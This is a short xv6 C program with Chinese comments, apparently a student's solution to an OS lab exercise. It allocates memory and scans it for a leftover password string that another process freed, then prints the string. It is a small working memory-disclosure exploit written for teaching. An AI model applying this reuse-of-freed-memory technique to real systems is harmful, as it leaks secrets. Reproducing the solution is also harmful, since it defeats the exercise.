#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

int main(int argc, char *argv[]) {
    // 1. 申请一大块内存，确保把 secret 释放的物理页全部分配过来
    int sz = 32 * 4096;
    char *mem = sbrk(sz);

    if (mem == (char*)-1) {
        printf("attack: sbrk failed\n");
        exit(1);
    }

    // 2. 遍历这块内存，寻找密码
    for (int i = 0; i < sz; i++) {
        char c = mem[i];
        
        // 判断当前字符是否是字母或数字
        int is_alnum = (c >= 'a' && c <= 'z') || 
                       (c >= 'A' && c <= 'Z') || 
                       (c >= '0' && c <= '9');
        
        if (is_alnum) {
            int len = 0;
            // 往后数，看看这个连续的字母数字串有多长
            while (1) {
                char next_c = mem[i + len];
                int next_is_alnum = (next_c >= 'a' && next_c <= 'z') || 
                                    (next_c >= 'A' && next_c <= 'Z') || 
                                    (next_c >= '0' && next_c <= '9');
                if (!next_is_alnum) {
                    break;
                }
                len++;
            }
            
            // 3. 过滤出真正的密码
            // 测试脚本生成的密码一般有一定长度。
            // 并且确认字符串是以 '\0' 结尾的，这才是合法的 C 语言字符串
            if (len >= 5 && mem[i + len] == '\0') {
                printf("%s\n", &mem[i]); // 打印出密码
                exit(0);                 // 拿到密码，立刻撤退
            }
            
            // 如果不是，跳过这段无效字符，继续往后找
            i += len;
        }
    }
    
    exit(1);
}